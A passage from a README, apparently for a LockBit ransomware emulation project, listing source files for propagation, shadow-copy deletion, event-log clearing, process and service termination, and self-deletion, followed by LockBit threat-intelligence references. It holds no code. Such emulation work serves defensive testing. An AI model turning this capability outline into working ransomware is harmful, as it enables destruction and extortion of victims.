  | `src/lockbit_main/guardrails/mutex_test.cpp` | Unit tests for the mutex check |
  | `src/lockbit_main/guardrails/mutex.cpp` | Implements the mutex check |
  | `src/lockbit_main/propagate/` | Source code for lateral movement |
  | `src/lockbit_main/propagate/local_ips_test.cpp` | Unit tests for handling local IPs and CIDRs |
  | `src/lockbit_main/propagate/local_ips.cpp` | Implements handling local IPs and CIDRs |
  | `src/lockbit_main/propagate/ping_test.cpp` | Unit tests for pinging |
  | `src/lockbit_main/propagate/ping.cpp` | Implements pinging targets |
  | `src/lockbit_main/propagate/propagate_test.cpp` | Unit tests for propagation logic |
  | `src/lockbit_main/propagate/propagate.cpp` | Implements propagation logic |
  | `src/lockbit_main/tamper/` | Source code for tamper functionality |
  | `src/lockbit_main/tamper/boot_recovery.cpp` | Implements disabling boot recovery |
  | `src/lockbit_main/tamper/event_log.cpp` | Implements clearing and disabling Windows event log channels |
  | `src/lockbit_main/tamper/proc_test.cpp` | Unit tests for terminating processes |
  | `src/lockbit_main/tamper/proc.cpp` | Implements terminating processes |
  | `src/lockbit_main/tamper/shadow.cpp` | Implements deleting shadow copies |
  | `src/lockbit_main/tamper/svc_test.cpp` | Unit tests for terminating and disabling services |
  | `src/lockbit_main/tamper/svc.cpp` | Implements terminating and disabling services |
  | `src/lockbit_main/CMakeLists.txt` | Defines the main LockBit executable cmake target |
  | `src/lockbit_main/discovery_test.cpp` | Unit tests for discovery |
  | `src/lockbit_main/discovery.cpp` | Implements discovery functions (username, hostname, domain, OS arch, OS version) |
  | `src/lockbit_main/execute_test.cpp` | Unit tests for executing processes |
  | `src/lockbit_main/execute.cpp` | Implements executing processes |
  | `src/lockbit_main/execute.cpp` | Implements executing processes |
  | `src/lockbit_main/main.cpp` | Main logic for the main LockBit executable |
  | `src/lockbit_minimal/` | Source code for the minimal executable |
  | `src/lockbit_minimal/CMakeLists.txt` | Defines the minimal executable cmake target |
  | `src/lockbit_minimal/minimal_main.cpp` | Main logic for the minimal executable |
  | `src/self_del_helper/` | Source code for the self-delete helper executable |
  | `src/self_del_helper/CMakeLists.txt` | Defines the self-delete helper cmake target |
  | `src/self_del_helper/self_del_main.cpp` | Main logic for the self-delete helper |
  | `src/self_del_helper/self_del_test.cpp` | Unit tests for the self-delete helper |
  | `src/self_del_helper/self_del.cpp` | Implements self-delete functionality |
  | `src/CMakeLists.txt` | Sets unit test files and invokes component cmake targets |
  | `src/xor_file.ps1` | XORs a given file. Invoked during build process by cmake to XOR resources |
  | `tests/` | main test directory |
  | `tests/gtest/` | main google test directory |
  | `tests/gtest/CMakeLists.txt` | Defines unit test and test helper targets, and runs unit tests |
  | `tests/gtest/noop_proc.cpp` | Implements a no-op executable used to test process termination |
  | `tests/gtest/noop_svc.cpp` | Implements a no-op service executable used to test service termination |
  | `tests/CMakeLists.txt` | Invokes the google test cmake setup |
  | `CMakeLists.txt` | Defines the LockBit cmake project |
  | `CMakePresets.json` | Defines cmake presets |

</details>

## CTI

1. [Antiy Labs. (2023, Nov 27). Analysis of LockBit Ransomware Samples and Considerations for Defense Against Targeted Ransomware](https://www.antiy.net/p/analysis-of-lockbit-ransomware-samples-and-considerations-for-defense-against-targeted-ransomware/)
2. [CISA. (2023, Mar 16). #StopRansomware: LockBit 3.0](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a)
3. [CISA. (2023, Jun 14). Understanding Ransomware Threat Actors: LockBit](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a)
4. [Red Piranha. (2023, Feb 22). A Look At Lockbit 3 Ransomware](https://redpiranha.net/news/look-lockbit-3-ransomware)
5. [Cybereason. (2023). Threat Analysis Report: Assemble Lockbit 3.0](https://www.cybereason.com/hubfs/dam/collateral/reports/Threat-Analysis-Assemble-LockBit-3.pdf) [Associated blog post](https://www.cybereason.com/blog/threat-analysis-assemble-lockbit-3)
6. [Swascan. LockBit 3.0: Dynamic malware analysis](https://www.swascan.com/lockbit-3-0-dynamic-malware-analysis/)
7. [Securelist. (2023, Aug 25). Lockbit leak, research opportunities on tools leaked from TAs](https://securelist.com/lockbit-ransomware-builder-analysis/110370/)
8. [Microsoft 365 Security. (2022, Oct 19). Investigating Ransomware Deployments That Happened Via Group Policy](https://m365internals.com/2022/10/19/investigating-ransomware-deployments-that-happened-via-group-policy/)
9. [The DFIR Report. (2020, Jun 10). Lockbit Ransomware, Why You No Spread?](https://thedfirreport.com/2020/06/10/lockbit-ransomware-why-you-no-spread/)
10. [Trend Micro. (2022, Jul 25). LockBit Ransomware Group Augments Its Latest Variant, LockBit 3.0, With BlackMatter Capabilities](https://www.trendmicro.com/en_za/research/22/g/lockbit-ransomware-group-augments-its-latest-variant--lockbit-3-.html)
11. [Trend Micro. (2024, Feb 20). Ransomware Spotlight: LockBit](https://www.trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-lockbit)
12. [Sophos. (2020, Apr 24). LockBit ransomware borrows tricks to keep up with REvil and Maze](https://news.sophos.com/en-us/2020/04/24/lockbit-ransomware-borrows-tricks-to-keep-up-with-revil-and-maze/)
13. [Lexfo. (2020, Oct 2). Lockbit analysis](https://blog.lexfo.fr/lockbit-malware.html)
14. [Cybereason. THREAT ANALYSIS REPORT: LockBit 2.0 - All Paths Lead to Ransom](https://www.cybereason.com/blog/threat-analysis-report-lockbit-2.0-all-paths-lead-to-ransom)
15. [Symantec. (2022, Jul 20). LockBit: Ransomware Puts Servers in the Crosshairs](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/lockbit-targets-servers)
16. [Sangfor. (2023, Feb 20). An Analysis of the New LockBit Green Ransomware with Conti-Based Encryptor](https://www.sangfor.com/farsight-labs-threat-intelligence/cybersecurity/lockbit-green-ransomware-conti-based-encryptor)

## Other References

- TBD
